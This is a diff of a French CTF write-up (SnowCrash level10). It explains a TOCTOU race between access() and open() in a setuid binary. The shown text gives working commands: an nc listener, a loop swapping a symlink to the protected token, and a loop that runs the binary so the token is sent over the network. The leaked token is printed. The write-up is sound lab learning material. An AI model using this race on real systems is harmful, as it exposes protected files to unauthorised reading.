@@ -100,32 +100,27 @@ void main(int param_1,undefined4 *param_2)
 ```
 On voit que le binaire se connecte à une socket sur le port `6969` et envoie le contenu du fichier passé en argument.
 
-Dans le code nous voyons aussi que le binaire essaye d'accéder au fichier passé en argument avec la fonction `access` et si l'accès est refusé il affiche un message d'erreur. puis il essaye d'ouvrir le fichier avec la fonction `open` et si l'ouverture est refusée il affiche un message d'erreur.
+Dans le code nous voyons aussi que le binaire essaye d'accéder au fichier passé en argument avec la fonction `access` et si l'accès est refusé il affiche un message d'erreur. puis il essaye d'ouvrir le fichier avec la fonction `open`,si l'ouverture est refusée il affiche un message d'erreur, autrement il print le contenu du fichier dans le socket.
 
-nous decidons donc d'utiliser cette faille en envoyant un lien symbolique vers le fichier `token` qui est en `rw` pour le user `level10`.
+Nous allons reproduire la faille TOUCTOU qui consiste à envoyer un lien symbolique vers le fichier `token` qui est en `rw` pour le user `level10` et d'essayer de lire en continue le fichier. Le léger timing entre le access et open nous permettra en forçant d'y accéder.
 
-lorsque nous souhaitons voir si nous sommes connecter au port 6969 nous recevons le message suivant :
-```bash
-level10@SnowCrash:~$ telnet 6969
-Trying 0.0.27.57...
-telnet: Unable to connect to remote host: Invalid argument
-```
-nous decidons de nous connecter au port `6969` avec `nc`
+On se connecte au port `6969` avec `nc`
 
 ```bash
 level10@SnowCrash:~$ nc -l 6969
 ```
 
-nous ouvrons un autre terminal et nous créons un lien symbolique vers le fichier `token` dans le répertoire `/tmp` et nous le nommons `level11`.
+Via un autre terminal nous créons un lien symbolique vers le fichier `token` dans le répertoire `/tmp` et nous le nommons `level11` en boucle.
 
 ```bash
 while true; do ln -fs /home/user/level10/level10 /tmp/level11tmp; ln -sf /home/user/level10/token /tmp/level11tmp; done
 ```
-nous ouvrons un autre terminal et nous lançons le binaire `level10` avec le lien symbolique `level11`.
+Et avec un dernier terminal  nous lançons le binaire `level10` avec le lien symbolique `level11` en boucle.
 
 ```bash
 while true; do ./level10 /tmp/level11tmp 10.0.2.15; done
 ```
+
 Sur le terminal ou nous avons lancé `nc` nous voyons le contenu du fichier `token` s'afficher.
 
 ```bash
@@ -134,7 +129,7 @@ level10@SnowCrash:~$ nc -l 6969
 .*( )*.
 woupa2yuojeeaaed06riuj63c
 ```
-nous nous connectons au user `flag10` et nous faisons le `getflag`.
+Nous nous connectons au user `flag10` et nous faisons le `getflag`.
 
 ```bash
 flag10@SnowCrash:~$ getflag
